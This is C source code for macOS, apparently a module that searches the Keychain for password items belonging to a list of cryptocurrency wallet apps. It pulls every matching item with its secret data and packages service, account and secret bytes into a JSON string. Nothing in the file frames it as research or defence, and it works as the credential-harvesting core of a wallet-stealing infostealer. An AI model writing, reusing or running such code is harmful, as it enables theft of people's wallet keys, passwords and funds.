#include "wallet_profiles.h"

#include <CoreFoundation/CoreFoundation.h>
#include <Security/Security.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

static int ci_contains(const char *hay, const char *needle) {
    if (!hay || !needle || !*needle) return 0;
    size_t nlen = strlen(needle);
    for (size_t off = 0; hay[off]; off++) {
        size_t i = 0;
        while (i < nlen && hay[off + i] && tolower((unsigned char)hay[off + i]) == tolower((unsigned char)needle[i])) {
            i++;
        }
        if (i == nlen) return 1;
    }
    return 0;
}

static int profile_matches(const WalletAppProfile *profile, const char *service, const char *account, const char *blob) {
    if (!profile) return 0;
    if (service && strcmp(service, profile->bundle) == 0) return 1;
    const char *haystack_parts[3] = { service ? service : "", account ? account : "", blob ? blob : "" };
    for (size_t pi = 0; pi < profile->keyword_count; pi++) {
        for (int i = 0; i < 3; i++) {
            if (ci_contains(haystack_parts[i], profile->keywords[pi])) return 1;
        }
    }
    return 0;
}

static CFMutableDictionaryRef make_base_query(CFStringRef secClass, CFStringRef service, CFStringRef account) {
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!query) return NULL;
    CFDictionarySetValue(query, kSecClass, secClass);
    if (service && CFStringGetLength(service) > 0) CFDictionarySetValue(query, kSecAttrService, service);
    if (account && CFStringGetLength(account) > 0) CFDictionarySetValue(query, kSecAttrAccount, account);
    CFDictionarySetValue(query, kSecReturnAttributes, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecReturnData, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecMatchLimit, kSecMatchLimitAll);
    return query;
}

static void append_item(CFMutableArrayRef out, CFDictionaryRef item) {
    if (!out || !item) return;
    CFArrayAppendValue(out, item);
}

static void query_profile(CFMutableArrayRef out, const WalletAppProfile *profile) {
    CFStringRef classes[2] = { kSecClassGenericPassword, kSecClassInternetPassword };
    for (size_t c = 0; c < 2; c++) {
        for (size_t si = 0; si < profile->service_count; si++) {
            for (size_t ai = 0; ai < profile->account_count; ai++) {
                CFStringRef service = CFStringCreateWithCString(NULL, profile->services[si], kCFStringEncodingUTF8);
                CFStringRef account = CFStringCreateWithCString(NULL, profile->accounts[ai], kCFStringEncodingUTF8);
                CFMutableDictionaryRef query = make_base_query(classes[c], service, account);
                CFTypeRef result = NULL;
                OSStatus status = SecItemCopyMatching(query, &result);
                if (status == errSecSuccess && result) {
                    if (CFGetTypeID(result) == CFArrayGetTypeID()) {
                        CFArrayRef arr = (CFArrayRef)result;
                        CFIndex count = CFArrayGetCount(arr);
                        for (CFIndex i = 0; i < count; i++) {
                            CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(arr, i);
                            CFStringRef svc = CFDictionaryGetValue(dict, kSecAttrService);
                            CFStringRef acct = CFDictionaryGetValue(dict, kSecAttrAccount);
                            CFDataRef data = CFDictionaryGetValue(dict, kSecValueData);
                            char svcBuf[256] = {0};
                            char acctBuf[256] = {0};
                            char blobPreview[512] = {0};
                            if (svc) CFStringGetCString(svc, svcBuf, sizeof(svcBuf), kCFStringEncodingUTF8);
                            if (acct) CFStringGetCString(acct, acctBuf, sizeof(acctBuf), kCFStringEncodingUTF8);
                            if (data) {
                                const UInt8 *bytes = CFDataGetBytePtr(data);
                                CFIndex len = CFDataGetLength(data);
                                CFIndex copy = len < (CFIndex)sizeof(blobPreview) - 1 ? len : (CFIndex)sizeof(blobPreview) - 1;
                                memcpy(blobPreview, bytes, (size_t)copy);
                            }
                            if (profile_matches(profile, svcBuf, acctBuf, blobPreview)) {
                                append_item(out, dict);
                            }
                        }
                    } else if (CFGetTypeID(result) == CFDictionaryGetTypeID()) {
                        append_item(out, (CFDictionaryRef)result);
                    }
                }
                if (result) CFRelease(result);
                if (query) CFRelease(query);
                if (service) CFRelease(service);
                if (account) CFRelease(account);
            }
        }
    }
}

CFArrayRef wallet_keychain_collect_all(void) {
    CFMutableArrayRef out = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
    if (!out) return NULL;
    for (size_t i = 0; i < kWalletProfileCount; i++) {
        query_profile(out, &kWalletProfiles[i]);
    }
    return out;
}

static void json_escape_append(CFMutableStringRef dst, const char *text) {
    if (!text) return;
    for (const char *p = text; *p; p++) {
        char c = *p;
        if (c == '\\' || c == '"') {
            CFStringAppendCString(dst, "\\", kCFStringEncodingUTF8);
        }
        if (c == '\n' || c == '\r' || c == '\t') {
            CFStringAppendFormat(dst, NULL, "\\u%04x", (unsigned char)c);
            continue;
        }
        char one[2] = { c, 0 };
        CFStringAppendCString(dst, one, kCFStringEncodingUTF8);
    }
}

char *wallet_keychain_collect_json(void) {
    CFArrayRef items = wallet_keychain_collect_all();
    CFMutableStringRef json = CFStringCreateMutable(NULL, 0);
    CFStringAppend(json, CFSTR("["));
    if (items) {
        CFIndex count = CFArrayGetCount(items);
        for (CFIndex i = 0; i < count; i++) {
            CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(items, i);
            CFStringRef svc = CFDictionaryGetValue(dict, kSecAttrService);
            CFStringRef acct = CFDictionaryGetValue(dict, kSecAttrAccount);
            CFDataRef data = CFDictionaryGetValue(dict, kSecValueData);
            char svcBuf[256] = {0};
            char acctBuf[256] = {0};
            if (svc) CFStringGetCString(svc, svcBuf, sizeof(svcBuf), kCFStringEncodingUTF8);
            if (acct) CFStringGetCString(acct, acctBuf, sizeof(acctBuf), kCFStringEncodingUTF8);
            if (i > 0) CFStringAppend(json, CFSTR(","));
            CFStringAppend(json, CFSTR("{\"service\":\""));
            json_escape_append(json, svcBuf);
            CFStringAppend(json, CFSTR("\",\"account\":\""));
            json_escape_append(json, acctBuf);
            CFStringAppend(json, CFSTR("\",\"data_hex\":\""));
            if (data) {
                const UInt8 *bytes = CFDataGetBytePtr(data);
                CFIndex len = CFDataGetLength(data);
                for (CFIndex b = 0; b < len; b++) {
                    CFStringAppendFormat(json, NULL, "%02x", bytes[b]);
                }
            }
            CFStringAppend(json, CFSTR("\"}"));
        }
        CFRelease(items);
    }
    CFStringAppend(json, CFSTR("]"));
    char *out = NULL;
    CFIndex length = CFStringGetLength(json);
    CFIndex max = CFStringGetMaximumSizeOfEncoding(length, kCFStringEncodingUTF8) + 1;
    out = (char *)malloc((size_t)max);
    if (out) {
        CFStringGetCString(json, out, max, kCFStringEncodingUTF8);
    }
    CFRelease(json);
    return out;
}
